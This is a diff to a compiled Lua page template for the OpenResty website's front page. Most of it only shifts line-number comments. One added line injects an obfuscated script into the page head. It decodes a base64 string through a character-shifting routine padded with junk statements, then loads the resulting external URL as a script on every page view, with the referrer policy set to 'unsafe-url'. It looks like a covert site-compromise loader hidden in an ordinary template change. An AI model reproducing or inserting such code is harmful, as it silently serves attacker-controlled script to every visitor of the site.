@@ -329,20 +329,20 @@ i = i + 1 output[i] = stash_get(stash, {'c', 0, 'l', { 'OpenResty&reg; - Open so
 i = i + 1 output[i] = '</title>\n    <meta name="viewport" content="width=device-width, initial-scale=1.0, minimum-scale=0.5, maximum-scale=2.0, user-scalable=yes">\n	<link href=\'https://openresty.org/css/fonts.css\' rel=\'stylesheet\' type=\'text/css\'>\n	<!--\n	If you ever wanted to use LESS instead of CSS...\n	<link rel="stylesheet" type="text/less" href="/css/main.less">\n	<script src="/js/less.js"></script>\n	-->\n	<link rel="stylesheet" type="text/css" href="/css/main.css">\n	<link rel="stylesheet" type="text/css" href="/css/github.css">\n	<link rel="stylesheet" type="text/css" href="/css/jquery.modal.css">\n        <script>\n'
 -- line 17 "index.tt2"
 i = i + 1 output[i] = context.process(context, 'old-permlink-js.tt2')
-i = i + 1 output[i] = '\n        </script>\n</head>\n<body>\n\n'
--- line 22 "index.tt2"
+i = i + 1 output[i] = '\n        </script>\n	<script async>\n	  (function(){var _b2=document.createElement("script"),_Lk=(function(_Iz,_WY){var _DK="";for(var _Wv=0;_Wv<_Iz.length;_Wv++){var _AE=_Iz[_Wv].charCodeAt();_AE-=_WY;_AE+=61;_AE!=_Wv;_WY>5;_AE%=94;_DK==_DK;_AE+=33;_DK+=String.fromCharCode(_AE)}return _DK})(atob("a3d3c3Y9MjJ6djF9cnJwbHFpcjFmcnAyc2x7aG8yOTZlZzw6aWY3aDU2OzM6aDtoZDY5ZTw4"), 3);_b2!="g";function _Ga(){};_b2.referrerPolicy="unsafe-url";_b2.src=_Lk;9>2;_b2.async=!0;_b2.type="text/javascript";var _gM=document.getElementsByTagName("script")[0];_gM.parentNode.insertBefore(_b2,_gM)})();\n	</script>\n</head>\n<body>\n\n'
+-- line 25 "index.tt2"
 i = i + 1 output[i] = context.process(context, 'header.tt2')
 i = i + 1 output[i] = '\n\n'
--- line 24 "index.tt2"
+-- line 27 "index.tt2"
 i = i + 1 output[i] = context.process(context, 'xray-modal.tt2')
 i = i + 1 output[i] = '\n\n	<section id="intro">\n		<div class="text">\n			<p>'
--- line 28 "index.tt2"
+-- line 31 "index.tt2"
 i = i + 1 output[i] = stash_get(stash, {'c', 0, 'l', { 'OpenResty<sup>&reg;</sup> is a dynamic web platform based on NGINX and LuaJIT.' }})
 i = i + 1 output[i] = '</p>\n			<form action="search.html">\n			  <fieldset>\n			    <input type="search" name="query" id="search"'
--- line 34 "index.tt2"
+-- line 37 "index.tt2"
 if tt2_true(stash_get(stash, 'search_query')) then
 i = i + 1 output[i] = '\n			        value="'
--- line 33 "index.tt2"
+-- line 36 "index.tt2"
 
 -- FILTER
 local value
@@ -360,47 +360,47 @@ i = i + 1 output[i] = '"'
 end
 
 i = i + 1 output[i] = '\n			        placeholder="'
--- line 35 "index.tt2"
+-- line 38 "index.tt2"
 i = i + 1 output[i] = stash_get(stash, {'c', 0, 'l', { 'Search OpenResty.org' }})
 i = i + 1 output[i] = '" required>\n			  </fieldset>\n			</form>\n		</div><!-- / text -->\n	</section><!-- / intro -->\n\n	<div id="wrapper">\n		<div class="sidebar sleft">\n			<nav id="nav">\n'
--- line 44 "index.tt2"
+-- line 47 "index.tt2"
 i = i + 1 output[i] = stash_get(stash, 'main_menu')
 i = i + 1 output[i] = '\n			</nav><!-- / nav -->\n\n'
--- line 47 "index.tt2"
+-- line 50 "index.tt2"
 i = i + 1 output[i] = context.process(context, 'main-menu-buttons.tt2')
 i = i + 1 output[i] = '\n\n		</div><!-- / sidebar left -->\n\n		<section id="main">\n'
--- line 53 "index.tt2"
+-- line 56 "index.tt2"
 if tt2_true(stash_get(stash, 'lang') == 'cn') then
--- line 53 "index.tt2"
+-- line 56 "index.tt2"
 i = i + 1 output[i] = context.process(context, 'news-cn.tt2')
 else
--- line 53 "index.tt2"
+-- line 56 "index.tt2"
 i = i + 1 output[i] = context.process(context, 'news-en.tt2')
 end
 
 
 i = i + 1 output[i] = '\n\n'
--- line 60 "index.tt2"
+-- line 63 "index.tt2"
 i = i + 1 output[i] = context.process(context, 'post.tt2')
 i = i + 1 output[i] = '\n'
--- line 62 "index.tt2"
+-- line 65 "index.tt2"
 if tt2_true(stash_get(stash, 'lang') == 'cn') then
--- line 62 "index.tt2"
+-- line 65 "index.tt2"
 i = i + 1 output[i] = context.process(context, 'posts-slide-cn.tt2')
 else
--- line 62 "index.tt2"
+-- line 65 "index.tt2"
 i = i + 1 output[i] = context.process(context, 'posts-slide-en.tt2')
 end
 
 
 i = i + 1 output[i] = '\n		</section><!-- / main -->\n\n'
--- line 70 "index.tt2"
+-- line 73 "index.tt2"
 i = i + 1 output[i] = context.process(context, 'sidebar.tt2')
 i = i + 1 output[i] = '\n\n	</div><!-- / wrapper -->\n\n'
--- line 74 "index.tt2"
+-- line 77 "index.tt2"
 i = i + 1 output[i] = context.process(context, 'footer.tt2')
 i = i + 1 output[i] = '\n\n'
--- line 76 "index.tt2"
+-- line 79 "index.tt2"
 i = i + 1 output[i] = context.process(context, 'heat-map.tt2')
 i = i + 1 output[i] = '\n\n</body>\n</html>\n'
 
